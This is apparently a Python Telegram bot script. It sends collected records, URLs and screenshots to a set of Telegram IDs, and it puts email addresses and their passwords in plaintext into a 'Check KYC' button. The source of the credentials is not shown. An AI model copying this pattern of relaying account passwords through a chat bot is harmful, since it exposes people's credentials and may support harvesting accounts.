import asyncio

from aiogram import Bot, Dispatcher, executor
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from config import BOT_TOKEN, tg_ids
from aiogram.types import Message
import asyncio
from data_class import data_cl
from threading import Thread
from main import launch


storage = MemoryStorage()
loop = asyncio.get_event_loop()
bot = Bot(BOT_TOKEN, parse_mode='HTML', disable_web_page_preview=True)
dp = Dispatcher(bot, storage=storage, loop=loop)

async def on_startup(dp):
    for ui in tg_ids:
        await bot.send_message(chat_id=ui, text='Бот запущен')

async def send_data(data:data_cl, url:str):
    markup = InlineKeyboardMarkup()
    markup.insert(InlineKeyboardButton(text='Проверить KYC', callback_data=f'check_account_{data.mail}:{data.pass_mail}'))
    for user_id in tg_ids:
        await bot.send_message(chat_id= user_id, text=f'{data} -- {url}', reply_markup=markup)

async def send_screen(name_file:str, data:data_cl):
    name_file = InputFile(name_file.replace(r'\\', '/'))
    for ui in tg_ids:
        await bot.send_photo(chat_id=ui, photo=name_file, caption=f'{data}')

def start_bot():
    Thread(target=launch).start()
    executor.start_polling(dp, on_startup=on_startup)
